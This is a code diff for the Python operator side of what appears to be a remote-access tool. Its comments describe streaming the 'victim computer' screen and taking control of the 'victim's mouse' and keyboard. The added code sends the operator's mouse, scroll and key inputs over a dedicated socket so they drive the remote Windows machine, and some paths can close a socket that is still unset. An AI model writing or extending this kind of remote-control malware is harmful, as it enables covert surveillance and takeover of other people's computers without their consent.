@@ -23,6 +23,8 @@ threadRun = False
 # globals for tracking if mouse & keyboard control is enabled
 mouseControl = False
 keyboardControl = False
+# global input socket used for sending inputs from pgame
+inputSock = None
 
 """
 	Enable/disable video stream from victim computer
@@ -63,9 +65,16 @@ def toggleVideo(state, mainSock):
 """
 def toggleKeyboard(state, mainSock):
 	global keyboardControl
+	global mouseControl
+	global inputSock
 	keyboardControl = state
 	if state: # make sure video stream is on if controlling keyboard
 		toggleVideo(state, mainSock)
+		mainSock.sendall(bytes([START_KEYS]) + b'\0')
+		if not inputSock:
+			inputSock = utils.openConnection(INPUT_PORT)
+	elif not mouseControl:
+		inputSock.close()
 
 """
 	Enable/disable control of victim's mouse
@@ -73,9 +82,16 @@ def toggleKeyboard(state, mainSock):
 """
 def toggleMouse(state, mainSock):
 	global mouseControl
+	global keyboardControl
+	global inputSock
 	mouseControl = state
 	if state: # make sure video stream is on if controlling mouse
 		toggleVideo(state, mainSock)
+		mainSock.sendall(bytes([START_MOUSE]) + b'\0')
+		if not inputSock:
+			inputSock = utils.openConnection(INPUT_PORT)
+	elif not keyboardControl:
+		inputSock.close()
 
 """
 	Create a class to handle all the pygame-based functionality
@@ -117,6 +133,7 @@ class videoRecvThread (threading.Thread):
 		global mouseControl
 		global keyboardControl
 		global threadRun
+		global inputSock
 		# send signal to start video and create socket
 		self.mainSock.sendall(bytes([START_VIDEO]) + b'\0')
 		self.videoSock = utils.openConnection(VIDEO_PORT)
@@ -132,7 +149,9 @@ class videoRecvThread (threading.Thread):
 			self.mainSock.sendall(bytes([END_KEYS]) + b'\0')
 			keyboardControl = False
 		self.mainSock.sendall(bytes([END_VIDEO]) + b'\0')
-		# close the video socket
+		# close the video socket and input socket
+		inputSock.close()
+		inputSock = None
 		self.videoSock.close()
 
 """
@@ -146,9 +165,14 @@ def pygameHandler(mainSock):
 	global imageBuffer
 	global imageMeta
 	global threadRun
+	global mouseControl
+	global keyboardControl
+	global inputSock
 
 	# initialize the pygame module
 	pygame.init()
+	# prevent mouse motion events from appearing on the event queue
+	pygame.event.set_blocked(pygame.MOUSEMOTION)
 	# load and set the logo
 	pygame.display.set_caption("minimal program")
 
@@ -162,6 +186,7 @@ def pygameHandler(mainSock):
 	buff = b''
 	meta = {}
 	surf = None
+	surfRect = None # used to get the mouse position easier
 	# constants for panning and zooming
 	STEP_FACTOR = 20
 	ZOOM_FACTOR = 0.1
@@ -199,20 +224,44 @@ def pygameHandler(mainSock):
 			screen.fill((0, 0, 0))
 			windowSize = pygame.display.get_window_size()
 			centerX = (windowSize[0] - surf.get_width()) // 2
+			centerX = int(centerX + (offsetX * zoom))
 			centerY = (windowSize[1] - surf.get_height()) // 2
-			screen.blit(surf, (int(centerX + (offsetX * zoom)), int(centerY + (offsetY * zoom))))
+			centerY = int(centerY + (offsetY * zoom))
+			surfRect = surf.get_rect(topleft=(centerX, centerY))
+			screen.blit(surf, (centerX, centerY))
 			pygame.display.flip()
 			dirty = False
 		elif dirty: # dirty bit was set but the image to draw is None
 			print("surf is NONE!")
 
-		# event handling
+		# create a list for all the inputs to send
 		inputList = bytes([START_INPUT])
+		# always send the mouse position if we're controlling the mouse
+		if mouseControl and surfRect:
+			mouseX, mouseY = pygame.mouse.get_pos()
+			# get the x pos
+			mouseX = (mouseX - surfRect.x) / surfRect.width * meta[BASE_WIDTH]
+			if mouseX < 0:
+				mouseX = 0
+			elif mouseX > meta[BASE_WIDTH]:
+				mouseX = meta[BASE_WIDTH]
+			# convert pixel pos to absolute pos?
+			# idk, just loko here: https://stackoverflow.com/questions/7492529/how-to-simulate-a-mouse-movement
+			mouseX = mouseX * 0xFFFF / meta[BASE_WIDTH] + 1
+			# get the y pos
+			mouseY = (mouseY - surfRect.y) / surfRect.height * meta[BASE_HEIGHT]
+			if mouseY < 0:
+				mouseY = 0
+			elif mouseY > meta[BASE_HEIGHT]:
+				mouseY = meta[BASE_HEIGHT]
+			mouseY = mouseY * 0xFFFF / meta[BASE_HEIGHT] + 1
+			# put the mouse move into the input stream
+			inputList += bytes([MOUSE_POS]) + int(mouseX).to_bytes(4, 'big') + int(mouseY).to_bytes(4, 'big') + bytes([CONT_INPUT])
+		# go through the event queue
 		for event in pygame.event.get():
 			if event.type == pygame.QUIT: # was the windows closed?
 				return
 			elif event.type == pygame.KEYDOWN: # key was pressed down
-				print(f'Key {event.unicode} pressed')
 				if event.mod & pygame.KMOD_RCTRL: # right control is pressed down
 					dirty = True # assume that the image is mooved or resized
 					if event.key == pygame.K_UP: # move up - push image down - increase offsetY
@@ -240,24 +289,45 @@ def pygameHandler(mainSock):
 						inputList += bytes([KEY_DOWN, code, CONT_INPUT])
 					else: # TODO - debugging purposes only
 						print("Key does not map to Windows virtual-key code!")
-			elif event.type == pygame.KEYUP and keyboardControl: # key was released and we're sending keyboard inputs
+			elif event.type == pygame.KEYUP and keyboardControl and not event.mod & pygame.KMOD_RCTRL: # key released, keyboard controlled, right control not pressed
 				if event.key in KEY_DICT: # if the key mapped to the Windows virtual-key code
 					code = KEY_DICT[event.key]
 					inputList += bytes([KEY_UP, code, CONT_INPUT])
 				else: # TODO - debugging purposes only
 					print("Key does not map to Windows virtual-key code!")
-			elif event.type == pygame.MOUSEMOTION and mouseControl:
-				print("TODO")
-			elif event.type == pygame.MOUSEBUTTONDOWN and mouseControl:
-				print("TODO")
-			elif event.type == pygame.MOUSEBUTTONUP and mouseControl:
-				print("TODO")
+			elif mouseControl: # are we controlling the mouse?
+				if event.type == pygame.MOUSEWHEEL: # if the mousewheel was scrolled
+					scroll = event.y
+					if scroll < 0:
+						inputList += bytes([MOUSE_WHEEL, 0x00, abs(scroll), CONT_INPUT])
+					else:
+						inputList += bytes([MOUSE_WHEEL, scroll, CONT_INPUT])
+				elif event.type == pygame.MOUSEBUTTONDOWN and event.button <= 3: # were the left, right, or middle mouse buttons pressed?
+					code = MOUSE_DICT[event.button]
+					inputList += bytes([MOUSE_DOWN, code, CONT_INPUT])
+				elif event.type == pygame.MOUSEBUTTONUP and event.button <= 3: # were the left, right, or middle mouse buttons released?
+					code = MOUSE_DICT[event.button]
+					inputList += bytes([MOUSE_UP, code, CONT_INPUT])
 		# are there any inputs to send to the C client?
 		if len(inputList) > 1:
 			# replace the last CONT_INPUT byte with a null-terminator and send the input string
-			#inputList = inputList[:-1] + b'\0'
-			mainSock.sendall(inputList[:-1] + b'\0')
-
+			try:
+				inputSock.sendall(inputList[:-1] + b'\0')
+			except Exception as inst:
+				print(type(inst))
+				print(inst.args)
+				print(inst)
+				keyboardControl = False
+				mouseControl = False
+				try:
+					inputSock.close()
+				except Exception as inst:
+					print(type(inst))
+					print(inst.args)
+					print(inst)
+				inputSock = None
+		# limit framerate to 30 FPS
+		clock.tick(30)
 
 	# we've broken out of the loop
 	pygame.quit()
